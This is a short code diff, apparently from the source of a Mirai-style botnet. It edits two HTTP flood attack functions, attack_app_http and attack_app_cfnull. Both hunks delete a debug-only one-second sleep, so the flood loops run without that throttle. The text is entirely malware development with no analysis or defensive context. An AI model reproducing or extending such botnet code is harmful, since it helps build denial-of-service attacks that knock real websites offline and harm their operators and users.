@@ -842,13 +842,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
         // handle any sockets that didnt return from select here
         // also handle timeout on HTTP_CONN_QUEUE_RESTART just in case there was no other data to be read (^: (usually this will never happen)
-#ifdef DEBUG
-        if (sockets == 1)
-        {
-            printf("debug mode sleep\n");
-            sleep(1);
-        }
-#endif
+
     }
 }
 
@@ -1163,13 +1157,7 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
 
         // handle any sockets that didnt return from select here
         // also handle timeout on HTTP_CONN_QUEUE_RESTART just in case there was no other data to be read (^: (usually this will never happen)
-#ifdef DEBUG
-        if (sockets == 1)
-        {
-            printf("debug mode sleep\n");
-            sleep(1);
-        }
-#endif
+
     }
 }
 
